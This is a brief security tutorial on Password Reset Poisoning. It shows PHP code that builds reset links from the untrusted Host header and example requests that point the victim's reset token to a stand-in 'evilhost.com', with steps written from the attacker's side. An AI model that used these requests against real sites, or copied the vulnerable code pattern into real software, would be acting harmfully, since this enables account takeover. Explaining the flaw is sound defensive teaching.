# Password Reset Poisoning

Most of web application security vulnerabilities, leverage user input in ways that were not initially intended by their developer(s). Password Reset Poisoning is one such vulnerability, that leverages commonly unthought of headers, such as the `Host` header seen in an HTTP request:

```
GET https://example.com/reset.php?email=foo@bar.com HTTP/1.1
Host: evilhost.com
```

One common functionality in most web applications, is the ability to reset your password. Requesting to do so may sometimes involve sending an email to your inbox with a URL embedding in a special one-time token to click on. The one time token is there to allow the user to set a new password without having to specify the old (current) one.

Part of building that URL, is deciding what the domain should be, which in PHP may look something along the lines of:

```
$resetPasswordURL = “https://{$_SERVER[‘HTTP_HOST’]}/reset-password.php?token=12345678-1234-1234-1234-12345678901”;

```

As a malicious actor, you want to take control of a particular individual’s account. By leveraging Password Reset Poisoning, you can:

* Obtain the target’s email address used on the site.\
  This is sometimes done via:a) Social Engineering attacks (Phishing, Smishing etc.)\
  b) OSINT (Open-source Intelligence)\
  c) Mining old data breaches for the user’s information.
* Send a Password Reset request on behalf of the target scoped in step one, with the modified Host header like so:

```
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: evilhost.com

{“email”: “target@company.com”}
```

Which if we refer back to the previous code, will string interpolate the reset password URL to (for example):

**https://evilhost.com/reset-password.php?token=12345678-1234-1234-1234-12345678901**
